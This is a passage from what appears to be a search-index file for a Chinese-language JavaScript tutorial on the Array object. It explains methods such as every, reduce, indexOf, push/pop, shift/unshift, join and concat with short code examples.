\u6709\u4e00\u4e2a\u6210\u5458\u5927\u4e8e\u7b49\u4e8e3\uff0c some \u65b9\u6cd5\u5c31\u8fd4\u56de true \u3002 every \u65b9\u6cd5\u662f\u6240\u6709\u6210\u5458\u7684\u8fd4\u56de\u503c\u90fd\u662f true \uff0c\u6574\u4e2a every \u65b9\u6cd5\u624d\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \u3002 1 2 3 4 5 var arr = [ 1 , 2 , 3 , 4 , 5 ]; arr . every ( function ( elem , index , arr ) { return elem >= 3 ; }); // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u7ec4 arr \u5e76\u975e\u6240\u6709\u6210\u5458\u5927\u4e8e\u7b49\u4e8e 3 \uff0c\u6240\u4ee5\u8fd4\u56de false \u3002 \u6ce8\u610f\uff0c\u5bf9\u4e8e\u7a7a\u6570\u7ec4\uff0c some \u65b9\u6cd5\u8fd4\u56de false \uff0c every \u65b9\u6cd5\u8fd4\u56de true \uff0c\u56de\u8c03\u51fd\u6570\u90fd\u4e0d\u4f1a\u6267\u884c\u3002 1 2 3 4 function isEven ( x ) { return x % 2 === 0 } []. some ( isEven ) // false []. every ( isEven ) // true some \u548c every \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u7528\u6765\u7ed1\u5b9a\u53c2\u6570\u51fd\u6570\u5185\u90e8\u7684 this \u53d8\u91cf\u3002 reduce()\uff0creduceRight() \u00b6 reduce() \u65b9\u6cd5\u548c reduceRight() \u65b9\u6cd5\u4f9d\u6b21\u5904\u7406\u6570\u7ec4\u7684\u6bcf\u4e2a\u6210\u5458\uff0c\u6700\u7ec8\u7d2f\u8ba1\u4e3a\u4e00\u4e2a\u503c\u3002\u5b83\u4eec\u7684\u5dee\u522b\u662f\uff0c reduce() \u662f\u4ece\u5de6\u5230\u53f3\u5904\u7406\uff08\u4ece\u7b2c\u4e00\u4e2a\u6210\u5458\u5230\u6700\u540e\u4e00\u4e2a\u6210\u5458\uff09\uff0c reduceRight() \u5219\u662f\u4ece\u53f3\u5230\u5de6\uff08\u4ece\u6700\u540e\u4e00\u4e2a\u6210\u5458\u5230\u7b2c\u4e00\u4e2a\u6210\u5458\uff09\uff0c\u5176\u4ed6\u5b8c\u5168\u4e00\u6837\u3002 1 2 3 4 5 6 7 8 9 [ 1 , 2 , 3 , 4 , 5 ]. reduce ( function ( a , b ) { console . log ( a , b ); return a + b ; }) // 1 2 // 3 3 // 6 4 // 10 5 //\u6700\u540e\u7ed3\u679c\uff1a15 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c reduce() \u65b9\u6cd5\u7528\u6765\u6c42\u51fa\u6570\u7ec4\u6240\u6709\u6210\u5458\u7684\u548c\u3002 reduce() \u7684\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u6570\u7ec4\u6bcf\u4e2a\u6210\u5458\u90fd\u4f1a\u4f9d\u6b21\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\u3002\u5982\u679c\u6570\u7ec4\u6709 n \u4e2a\u6210\u5458\uff0c\u8fd9\u4e2a\u53c2\u6570\u51fd\u6570\u5c31\u4f1a\u6267\u884c n - 1 \u6b21\u3002 \u7b2c\u4e00\u6b21\u6267\u884c\uff1a a \u662f\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458 1 \uff0c b \u662f\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u6210\u5458 2 \u3002 \u7b2c\u4e8c\u6b21\u6267\u884c\uff1a a \u4e3a\u4e0a\u4e00\u8f6e\u7684\u8fd4\u56de\u503c 3 \uff0c b \u4e3a\u7b2c\u4e09\u4e2a\u6210\u5458 3 \u3002 \u7b2c\u4e09\u6b21\u6267\u884c\uff1a a \u4e3a\u4e0a\u4e00\u8f6e\u7684\u8fd4\u56de\u503c 6 \uff0c b \u4e3a\u7b2c\u56db\u4e2a\u6210\u5458 4 \u3002 \u7b2c\u56db\u6b21\u6267\u884c\uff1a a \u4e3a\u4e0a\u4e00\u8f6e\u8fd4\u56de\u503c 10 \uff0c b \u4e3a\u7b2c\u4e94\u4e2a\u6210\u5458 5 \u3002\u81f3\u6b64\u6240\u6709\u6210\u5458\u904d\u5386\u5b8c\u6210\uff0c\u6574\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5c31\u662f\u6700\u540e\u4e00\u8f6e\u7684\u8fd4\u56de\u503c 15 \u3002 reduce() \u65b9\u6cd5\u548c reduceRight() \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u662f\u4e00\u4e2a\u51fd\u6570\u3002\u8be5\u51fd\u6570\u63a5\u53d7\u4ee5\u4e0b\u56db\u4e2a\u53c2\u6570\u3002 \u7d2f\u79ef\u53d8\u91cf\u3002\u7b2c\u4e00\u6b21\u6267\u884c\u65f6\uff0c\u9ed8\u8ba4\u4e3a\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\uff1b\u4ee5\u540e\u6bcf\u6b21\u6267\u884c\u65f6\uff0c\u90fd\u662f\u4e0a\u4e00\u8f6e\u7684\u8fd4\u56de\u503c\u3002 \u5f53\u524d\u53d8\u91cf\u3002\u7b2c\u4e00\u6b21\u6267\u884c\u65f6\uff0c\u9ed8\u8ba4\u4e3a\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u6210\u5458\uff1b\u4ee5\u540e\u6bcf\u6b21\u6267\u884c\u65f6\uff0c\u90fd\u662f\u4e0b\u4e00\u4e2a\u6210\u5458\u3002 \u5f53\u524d\u4f4d\u7f6e\u3002\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u5f53\u524d\u53d8\u91cf\uff09\u7684\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u4e3a 1 \u3002 \u539f\u6570\u7ec4\u3002 \u8fd9\u56db\u4e2a\u53c2\u6570\u4e4b\u4e2d\uff0c\u53ea\u6709\u524d\u4e24\u4e2a\u662f\u5fc5\u987b\u7684\uff0c\u540e\u4e24\u4e2a\u5219\u662f\u53ef\u9009\u7684\u3002 1 2 3 4 5 6 7 [ 1 , 2 , 3 , 4 , 5 ]. reduce ( function ( a , // \u7d2f\u79ef\u53d8\u91cf\uff0c\u5fc5\u987b b , // \u5f53\u524d\u53d8\u91cf\uff0c\u5fc5\u987b i , // \u5f53\u524d\u4f4d\u7f6e\uff0c\u53ef\u9009 arr // \u539f\u6570\u7ec4\uff0c\u53ef\u9009 ) { // ... ... \u5982\u679c\u8981\u5bf9\u7d2f\u79ef\u53d8\u91cf\u6307\u5b9a\u521d\u503c\uff0c\u53ef\u4ee5\u628a\u5b83\u653e\u5728 reduce() \u65b9\u6cd5\u548c reduceRight() \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002 1 2 3 4 [ 1 , 2 , 3 , 4 , 5 ]. reduce ( function ( a , b ) { return a + b ; }, 10 ); // 25 \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\u53c2\u6570 a \u7684\u521d\u503c\u4e3a10\uff0c\u6240\u4ee5\u6570\u7ec4\u4ece10\u5f00\u59cb\u7d2f\u52a0\uff0c\u6700\u7ec8\u7ed3\u679c\u4e3a25\u3002\u6ce8\u610f\uff0c\u8fd9\u65f6 b \u662f\u4ece\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u5f00\u59cb\u904d\u5386\uff0c\u53c2\u6570\u51fd\u6570\u4f1a\u6267\u884c5\u6b21\u3002 \u5efa\u8bae\u603b\u662f\u52a0\u4e0a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd9\u6837\u6bd4\u8f83\u7b26\u5408\u76f4\u89c9\uff0c\u6bcf\u4e2a\u6570\u7ec4\u6210\u5458\u90fd\u4f1a\u4f9d\u6b21\u6267\u884c reduce() \u65b9\u6cd5\u7684\u53c2\u6570\u51fd\u6570\u3002\u53e6\u5916\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u9632\u6b62\u7a7a\u6570\u7ec4\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 function add ( prev , cur ) { return prev + cur ; } []. reduce ( add ) // TypeError: Reduce of empty array with no initial value []. reduce ( add , 1 ) // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u7a7a\u6570\u7ec4\u53d6\u4e0d\u5230\u7d2f\u79ef\u53d8\u91cf\u7684\u521d\u59cb\u503c\uff0c reduce() \u65b9\u6cd5\u4f1a\u62a5\u9519\u3002\u8fd9\u65f6\uff0c\u52a0\u4e0a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5c31\u80fd\u4fdd\u8bc1\u603b\u662f\u4f1a\u8fd4\u56de\u4e00\u4e2a\u503c\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a reduceRight() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 function subtract ( prev , cur ) { return prev - cur ; } [ 3 , 2 , 1 ]. reduce ( subtract ) // 0 [ 3 , 2 , 1 ]. reduceRight ( subtract ) // -4 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c reduce() \u65b9\u6cd5\u76f8\u5f53\u4e8e 3 \u51cf\u53bb 2 \u518d\u51cf\u53bb 1 \uff0c reduceRight \u65b9\u6cd5\u76f8\u5f53\u4e8e 1 \u51cf\u53bb 2 \u518d\u51cf\u53bb 3 \u3002 \u7531\u4e8e\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4f1a\u904d\u5386\u6570\u7ec4\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u53ef\u4ee5\u7528\u6765\u505a\u4e00\u4e9b\u904d\u5386\u76f8\u5173\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\uff0c\u627e\u51fa\u5b57\u7b26\u957f\u5ea6\u6700\u957f\u7684\u6570\u7ec4\u6210\u5458\u3002 1 2 3 4 5 6 7 function findLongest ( entries ) { return entries . reduce ( function ( longest , entry ) { return entry . length > longest . length ? entry : longest ; }, '' ); } findLongest ([ 'aaa' , 'bb' , 'c' ]) // \"aaa\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c reduce() \u7684\u53c2\u6570\u51fd\u6570\u4f1a\u5c06\u5b57\u7b26\u957f\u5ea6\u8f83\u957f\u7684\u90a3\u4e2a\u6570\u7ec4\u6210\u5458\uff0c\u4f5c\u4e3a\u7d2f\u79ef\u503c\u3002\u8fd9\u5bfc\u81f4\u904d\u5386\u6240\u6709\u6210\u5458\u4e4b\u540e\uff0c\u7d2f\u79ef\u503c\u5c31\u662f\u5b57\u7b26\u957f\u5ea6\u6700\u957f\u7684\u90a3\u4e2a\u6210\u5458\u3002 indexOf()\uff0clastIndexOf() \u00b6 indexOf \u65b9\u6cd5\u8fd4\u56de\u7ed9\u5b9a\u5143\u7d20\u5728\u6570\u7ec4\u4e2d\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6ca1\u6709\u51fa\u73b0\u5219\u8fd4\u56de -1 \u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . indexOf ( 'b' ) // 1 a . indexOf ( 'y' ) // -1 indexOf \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u641c\u7d22\u7684\u5f00\u59cb\u4f4d\u7f6e\u3002 1 [ 'a' , 'b' , 'c' ]. indexOf ( 'a' , 1 ) // -1 \u4e0a\u9762\u4ee3\u7801\u4ece1\u53f7\u4f4d\u7f6e\u5f00\u59cb\u641c\u7d22\u5b57\u7b26 a \uff0c\u7ed3\u679c\u4e3a -1 \uff0c\u8868\u793a\u6ca1\u6709\u641c\u7d22\u5230\u3002 lastIndexOf \u65b9\u6cd5\u8fd4\u56de\u7ed9\u5b9a\u5143\u7d20\u5728\u6570\u7ec4\u4e2d\u6700\u540e\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6ca1\u6709\u51fa\u73b0\u5219\u8fd4\u56de -1 \u3002 1 2 3 var a = [ 2 , 5 , 9 , 2 ]; a . lastIndexOf ( 2 ) // 3 a . lastIndexOf ( 7 ) // -1 \u6ce8\u610f\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u4e0d\u80fd\u7528\u6765\u641c\u7d22 NaN \u7684\u4f4d\u7f6e\uff0c\u5373\u5b83\u4eec\u65e0\u6cd5\u786e\u5b9a\u6570\u7ec4\u6210\u5458\u662f\u5426\u5305\u542b NaN \u3002 1 2 [ NaN ]. indexOf ( NaN ) // -1 [ NaN ]. lastIndexOf ( NaN ) // -1 \u8fd9\u662f\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u5185\u90e8\uff0c\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u8fdb\u884c\u6bd4\u8f83\uff0c\u800c NaN \u662f\u552f\u4e00\u4e00\u4e2a\u4e0d\u7b49\u4e8e\u81ea\u8eab\u7684\u503c\u3002 \u94fe\u5f0f\u4f7f\u7528 \u00b6 \u4e0a\u9762\u8fd9\u4e9b\u6570\u7ec4\u65b9\u6cd5\u4e4b\u4e2d\uff0c\u6709\u4e0d\u5c11\u8fd4\u56de\u7684\u8fd8\u662f\u6570\u7ec4\uff0c\u6240\u4ee5\u53ef\u4ee5\u94fe\u5f0f\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var users = [ { name : 'tom' , email : 'tom@example.com' }, { name : 'peter' , email : 'peter@example.com' } ]; users . map ( function ( user ) { return user . email ; }) . filter ( function ( email ) { return /^t/ . test ( email ); }) . forEach ( function ( email ) { console . log ( email ); }); // \"tom@example.com\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5148\u4ea7\u751f\u4e00\u4e2a\u6240\u6709 Email \u5730\u5740\u7ec4\u6210\u7684\u6570\u7ec4\uff0c\u7136\u540e\u518d\u8fc7\u6ee4\u51fa\u4ee5 t \u5f00\u5934\u7684 Email \u5730\u5740\uff0c\u6700\u540e\u5c06\u5b83\u6253\u5370\u51fa\u6765\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Nicolas Bevacqua, Fun with JavaScript Native Array Functions","title":"Array \u5bf9\u8c61"},{"location":"stdlib/array/#array","text":"","title":"Array \u5bf9\u8c61"},{"location":"stdlib/array/#_1","text":"Array \u662f JavaScript \u7684\u539f\u751f\u5bf9\u8c61\uff0c\u540c\u65f6\u4e5f\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u7528\u5b83\u751f\u6210\u65b0\u7684\u6570\u7ec4\u3002 1 2 3 var arr = new Array ( 2 ); arr . length // 2 arr // [ empty x 2 ] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Array() \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570 2 \uff0c\u8868\u793a\u751f\u6210\u4e00\u4e2a\u4e24\u4e2a\u6210\u5458\u7684\u6570\u7ec4\uff0c\u6bcf\u4e2a\u4f4d\u7f6e\u90fd\u662f\u7a7a\u503c\u3002 \u5982\u679c\u6ca1\u6709\u4f7f\u7528 new \u5173\u952e\u5b57\uff0c\u8fd0\u884c\u7ed3\u679c\u4e5f\u662f\u4e00\u6837\u7684\u3002 1 2 3 var arr = Array ( 2 ); // \u7b49\u540c\u4e8e var arr = new Array ( 2 ); \u8003\u8651\u5230\u8bed\u4e49\u6027\uff0c\u4ee5\u53ca\u4e0e\u5176\u4ed6\u6784\u9020\u51fd\u6570\u7528\u6cd5\u4fdd\u6301\u4e00\u81f4\uff0c\u5efa\u8bae\u603b\u662f\u52a0\u4e0a new \u3002 Array() \u6784\u9020\u51fd\u6570\u6709\u4e00\u4e2a\u5f88\u5927\u7684\u7f3a\u9677\uff0c\u4e0d\u540c\u7684\u53c2\u6570\u4e2a\u6570\u4f1a\u5bfc\u81f4\u4e0d\u4e00\u81f4\u7684\u884c\u4e3a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // \u65e0\u53c2\u6570\u65f6\uff0c\u8fd4\u56de\u4e00\u4e2a\u7a7a\u6570\u7ec4 new Array () // [] // \u5355\u4e2a\u6b63\u6574\u6570\u53c2\u6570\uff0c\u8868\u793a\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u7684\u957f\u5ea6 new Array ( 1 ) // [ empty ] new Array ( 2 ) // [ empty x 2 ] // \u975e\u6b63\u6574\u6570\u7684\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f1a\u62a5\u9519 new Array ( 3.2 ) // RangeError: Invalid array length new Array ( - 3 ) // RangeError: Invalid array length // \u5355\u4e2a\u975e\u6570\u503c\uff08\u6bd4\u5982\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u3001\u5bf9\u8c61\u7b49\uff09\u4f5c\u4e3a\u53c2\u6570\uff0c // \u5219\u8be5\u53c2\u6570\u662f\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u7684\u6210\u5458 new Array ( 'abc' ) // ['abc'] new Array ([ 1 ]) // [Array[1]] // \u591a\u53c2\u6570\u65f6\uff0c\u6240\u6709\u53c2\u6570\u90fd\u662f\u8fd4\u56de\u7684\u65b0\u6570\u7ec4\u7684\u6210\u5458 new Array ( 1 , 2 ) // [1, 2] new Array ( 'a' , 'b' , 'c' ) // ['a', 'b', 'c'] \u53ef\u4ee5\u770b\u5230\uff0c Array() \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u884c\u4e3a\u5f88\u4e0d\u4e00\u81f4\u3002\u56e0\u6b64\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528\u5b83\u751f\u6210\u65b0\u6570\u7ec4\uff0c\u76f4\u63a5\u4f7f\u7528\u6570\u7ec4\u5b57\u9762\u91cf\u662f\u66f4\u597d\u7684\u505a\u6cd5\u3002 1 2 3 4 5 // bad var arr = new Array ( 1 , 2 ); // good var arr = [ 1 , 2 ]; \u6ce8\u610f\uff0c\u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u6b63\u6574\u6570\uff0c\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u90fd\u662f\u7a7a\u4f4d\u3002\u867d\u7136\u8bfb\u53d6\u7684\u65f6\u5019\u8fd4\u56de undefined \uff0c\u4f46\u5b9e\u9645\u4e0a\u8be5\u4f4d\u7f6e\u6ca1\u6709\u4efb\u4f55\u503c\u3002\u867d\u7136\u8fd9\u65f6\u53ef\u4ee5\u8bfb\u53d6\u5230 length \u5c5e\u6027\uff0c\u4f46\u662f\u53d6\u4e0d\u5230\u952e\u540d\u3002 1 2 3 4 5 6 7 8 9 10 11 var a = new Array ( 3 ); var b = [ undefined , undefined , undefined ]; a . length // 3 b . length // 3 a [ 0 ] // undefined b [ 0 ] // undefined 0 in a // false 0 in b // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u662f Array() \u751f\u6210\u7684\u4e00\u4e2a\u957f\u5ea6\u4e3a3\u7684\u7a7a\u6570\u7ec4\uff0c b \u662f\u4e00\u4e2a\u4e09\u4e2a\u6210\u5458\u90fd\u662f undefined \u7684\u6570\u7ec4\uff0c\u8fd9\u4e24\u4e2a\u6570\u7ec4\u662f\u4e0d\u4e00\u6837\u7684\u3002\u8bfb\u53d6\u952e\u503c\u7684\u65f6\u5019\uff0c a \u548c b \u90fd\u8fd4\u56de undefined \uff0c\u4f46\u662f a \u7684\u952e\u540d\uff08\u6210\u5458\u7684\u5e8f\u53f7\uff09\u90fd\u662f\u7a7a\u7684\uff0c b \u7684\u952e\u540d\u662f\u6709\u503c\u7684\u3002","title":"\u6784\u9020\u51fd\u6570"},{"location":"stdlib/array/#_2","text":"","title":"\u9759\u6001\u65b9\u6cd5"},{"location":"stdlib/array/#arrayisarray","text":"Array.isArray \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u53c2\u6570\u662f\u5426\u4e3a\u6570\u7ec4\u3002\u5b83\u53ef\u4ee5\u5f25\u8865 typeof \u8fd0\u7b97\u7b26\u7684\u4e0d\u8db3\u3002 1 2 3 4 var arr = [ 1 , 2 , 3 ]; typeof arr // \"object\" Array . isArray ( arr ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c typeof \u8fd0\u7b97\u7b26\u53ea\u80fd\u663e\u793a\u6570\u7ec4\u7684\u7c7b\u578b\u662f Object \uff0c\u800c Array.isArray \u65b9\u6cd5\u53ef\u4ee5\u8bc6\u522b\u6570\u7ec4\u3002","title":"Array.isArray()"},{"location":"stdlib/array/#_3","text":"","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/array/#valueoftostring","text":"valueOf \u65b9\u6cd5\u662f\u4e00\u4e2a\u6240\u6709\u5bf9\u8c61\u90fd\u62e5\u6709\u7684\u65b9\u6cd5\uff0c\u8868\u793a\u5bf9\u8be5\u5bf9\u8c61\u6c42\u503c\u3002\u4e0d\u540c\u5bf9\u8c61\u7684 valueOf \u65b9\u6cd5\u4e0d\u5c3d\u4e00\u81f4\uff0c\u6570\u7ec4\u7684 valueOf \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4\u672c\u8eab\u3002 1 2 var arr = [ 1 , 2 , 3 ]; arr . valueOf () // [1, 2, 3] toString \u65b9\u6cd5\u4e5f\u662f\u5bf9\u8c61\u7684\u901a\u7528\u65b9\u6cd5\uff0c\u6570\u7ec4\u7684 toString \u65b9\u6cd5\u8fd4\u56de\u6570\u7ec4\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002 1 2 3 4 5 var arr = [ 1 , 2 , 3 ]; arr . toString () // \"1,2,3\" var arr = [ 1 , 2 , 3 , [ 4 , 5 , 6 ]]; arr . toString () // \"1,2,3,4,5,6\"","title":"valueOf()\uff0ctoString()"},{"location":"stdlib/array/#pushpop","text":"push \u65b9\u6cd5\u7528\u4e8e\u5728\u6570\u7ec4\u7684\u672b\u7aef\u6dfb\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u6dfb\u52a0\u65b0\u5143\u7d20\u540e\u7684\u6570\u7ec4\u957f\u5ea6\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 5 6 var arr = []; arr . push ( 1 ) // 1 arr . push ( 'a' ) // 2 arr . push ( true , {}) // 4 arr // [1, 'a', true, {}] \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528 push \u65b9\u6cd5\uff0c\u5f80\u6570\u7ec4\u4e2d\u6dfb\u52a0\u4e86\u56db\u4e2a\u6210\u5458\u3002 pop \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var arr = [ 'a' , 'b' , 'c' ]; arr . pop () // 'c' arr // ['a', 'b'] \u5bf9\u7a7a\u6570\u7ec4\u4f7f\u7528 pop \u65b9\u6cd5\uff0c\u4e0d\u4f1a\u62a5\u9519\uff0c\u800c\u662f\u8fd4\u56de undefined \u3002 1 []. pop () // undefined push \u548c pop \u7ed3\u5408\u4f7f\u7528\uff0c\u5c31\u6784\u6210\u4e86\u201c\u540e\u8fdb\u5148\u51fa\u201d\u7684\u6808\u7ed3\u6784\uff08stack\uff09\u3002 1 2 3 4 5 var arr = []; arr . push ( 1 , 2 ); arr . push ( 3 ); arr . pop (); arr // [1, 2] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 3 \u662f\u6700\u540e\u8fdb\u5165\u6570\u7ec4\u7684\uff0c\u4f46\u662f\u6700\u65e9\u79bb\u5f00\u6570\u7ec4\u3002","title":"push()\uff0cpop()"},{"location":"stdlib/array/#shiftunshift","text":"shift() \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . shift () // 'a' a // ['b', 'c'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528 shift() \u65b9\u6cd5\u4ee5\u540e\uff0c\u539f\u6570\u7ec4\u5c31\u53d8\u4e86\u3002 shift() \u65b9\u6cd5\u53ef\u4ee5\u904d\u5386\u5e76\u6e05\u7a7a\u4e00\u4e2a\u6570\u7ec4\u3002 1 2 3 4 5 6 7 8 var list = [ 1 , 2 , 3 , 4 ]; var item ; while ( item = list . shift ()) { console . log ( item ); } list // [] \u4e0a\u9762\u4ee3\u7801\u901a\u8fc7 list.shift() \u65b9\u6cd5\u6bcf\u6b21\u53d6\u51fa\u4e00\u4e2a\u5143\u7d20\uff0c\u4ece\u800c\u904d\u5386\u6570\u7ec4\u3002\u5b83\u7684\u524d\u63d0\u662f\u6570\u7ec4\u5143\u7d20\u4e0d\u80fd\u662f 0 \u6216\u4efb\u4f55\u5e03\u5c14\u503c\u7b49\u4e8e false \u7684\u5143\u7d20\uff0c\u56e0\u6b64\u8fd9\u6837\u7684\u904d\u5386\u4e0d\u662f\u5f88\u53ef\u9760\u3002 push() \u548c shift() \u7ed3\u5408\u4f7f\u7528\uff0c\u5c31\u6784\u6210\u4e86\u201c\u5148\u8fdb\u5148\u51fa\u201d\u7684\u961f\u5217\u7ed3\u6784\uff08queue\uff09\u3002 unshift() \u65b9\u6cd5\u7528\u4e8e\u5728\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\u6dfb\u52a0\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u6dfb\u52a0\u65b0\u5143\u7d20\u540e\u7684\u6570\u7ec4\u957f\u5ea6\u3002\u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4f1a\u6539\u53d8\u539f\u6570\u7ec4\u3002 1 2 3 4 var a = [ 'a' , 'b' , 'c' ]; a . unshift ( 'x' ); // 4 a // ['x', 'a', 'b', 'c'] unshift() \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u53c2\u6570\uff0c\u8fd9\u4e9b\u53c2\u6570\u90fd\u4f1a\u6dfb\u52a0\u5230\u76ee\u6807\u6570\u7ec4\u5934\u90e8\u3002 1 2 3 var arr = [ 'c' , 'd' ]; arr . unshift ( 'a' , 'b' ) // 4 arr // [ 'a', 'b', 'c', 'd' ]","title":"shift()\uff0cunshift()"},{"location":"stdlib/array/#join","text":"join() \u65b9\u6cd5\u4ee5\u6307\u5b9a\u53c2\u6570\u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u5c06\u6240\u6709\u6570\u7ec4\u6210\u5458\u8fde\u63a5\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u3002\u5982\u679c\u4e0d\u63d0\u4f9b\u53c2\u6570\uff0c\u9ed8\u8ba4\u7528\u9017\u53f7\u5206\u9694\u3002 1 2 3 4 5 var a = [ 1 , 2 , 3 , 4 ]; a . join ( ' ' ) // '1 2 3 4' a . join ( ' | ' ) // \"1 | 2 | 3 | 4\" a . join () // \"1,2,3,4\" \u5982\u679c\u6570\u7ec4\u6210\u5458\u662f undefined \u6216 null \u6216\u7a7a\u4f4d\uff0c\u4f1a\u88ab\u8f6c\u6210\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 [ undefined , null ]. join ( '#' ) // '#' [ 'a' ,, 'b' ]. join ( '-' ) // 'a--b' \u901a\u8fc7 call \u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5b57\u7b26\u4e32\u6216\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002 1 2 3 4 5 6 Array . prototype . join . call ( 'hello' , '-' ) // \"h-e-l-l-o\" var obj = { 0 : 'a' , 1 : 'b' , length : 2 }; Array . prototype . join . call ( obj , '-' ) // 'a-b'","title":"join()"},{"location":"stdlib/array/#concat","text":"concat \u65b9\u6cd5\u7528\u4e8e\u591a\u4e2a\u6570\u7ec4\u7684\u5408\u5e76\u3002\u5b83\u5c06\u65b0\u6570\u7ec4\u7684\u6210\u5458\uff0c\u6dfb\u52a0\u5230\u539f\u6570\u7ec4\u6210\u5458\u7684\u540e\u90e8\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u6570\u7ec4\uff0c\u539f\u6570\u7ec4\u4e0d\u53d8\u3002 1 2 3 4 5 6 7 8 9 10 11 [ 'hello' ]. concat ([ 'world' ]) // [\"hello\", \"world\"] [ 'hello' ]. concat ([ 'world' ], [ '!' ]) // [\"hello\", \"world\", \"!\"] []. concat ({ a : 1 }, { b : 2 }) // [{ a: 1 }, { b: 2 }] [ 2 ]. concat ({ a : 1 }) // [2, {a: 1}] 